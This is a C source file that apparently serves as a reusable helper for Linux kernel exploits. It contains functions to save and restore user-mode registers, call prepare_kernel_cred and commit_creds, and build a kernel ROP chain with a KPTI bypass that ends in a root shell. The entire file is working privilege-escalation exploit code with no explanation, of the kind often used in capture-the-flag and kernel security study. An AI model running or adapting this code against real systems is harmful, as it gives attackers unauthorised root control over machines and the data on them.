#include <unistd.h>

#include "vars.h"

void spawn_shell(void) {
    uid_t uid = getuid();
    if (uid != 0) {
        printf("[-] failed to get root (uid: %d)\n", uid);
        exit(1);
    }
    puts("[+] got root (uid = 0)");
    puts("[ ] spawning shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
    exit(EXIT_SUCCESS);
}

void save_state(void) {
    puts("[ ] saving user cs, ss, rsp, and rflags");
    asm volatile(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushfq;"
        "pop %3;"
        ".att_syntax;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
    printf("      user_cs     = 0x%016lx\n", user_cs);
    printf("      user_rflags = 0x%016lx\n", user_rflags);
    printf("      user_rsp    = 0x%016lx\n", user_rsp);
    printf("      user_ss     = 0x%016lx\n", user_ss);
}

void restore_state(void) {
    puts("[+] restoring state");
    if (user_rsp == 0) {
        puts("[-] please call save_state in advance");
    }
    asm volatile(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov QWORD PTR [rsp + 0x20], %0;"
        "mov QWORD PTR [rsp + 0x18], %1;"
        "mov QWORD PTR [rsp + 0x10], %2;"
        "mov QWORD PTR [rsp + 0x08], %3;"
        "mov QWORD PTR [rsp + 0x00], %4;"
        "iretq;"
        ".att_syntax;"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(spawn_shell));
}

void escalate_privilege(void) {
    puts("[+] escalating privilege");
    char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
    void (*cc)(char *) = (void *)(addr_commit_creds);
    if (addr_init_cred == DUMMY_VALUE + kbase_offset) {
        (*cc)((*pkc)(0));
    } else {
        (*cc)((char *)addr_init_cred);
    }
    restore_state();
}

void krop(u64 *ptr) {
    *ptr++ = pop_rdi_ret;
    *ptr++ = 0;
    *ptr++ = addr_prepare_kernel_cred;
    *ptr++ = pop_rcx_ret;
    *ptr++ = 0;
    *ptr++ = mov_rdi_rax_rep_ret;
    *ptr++ = addr_commit_creds;
    *ptr++ = bypass_kpti;
    *ptr++ = 0xdeadbeef;
    *ptr++ = 0xcafebabe;
    *ptr++ = (u64)&spawn_shell;
    *ptr++ = user_cs;
    *ptr++ = user_rflags;
    *ptr++ = user_rsp;
    *ptr++ = user_ss;
}
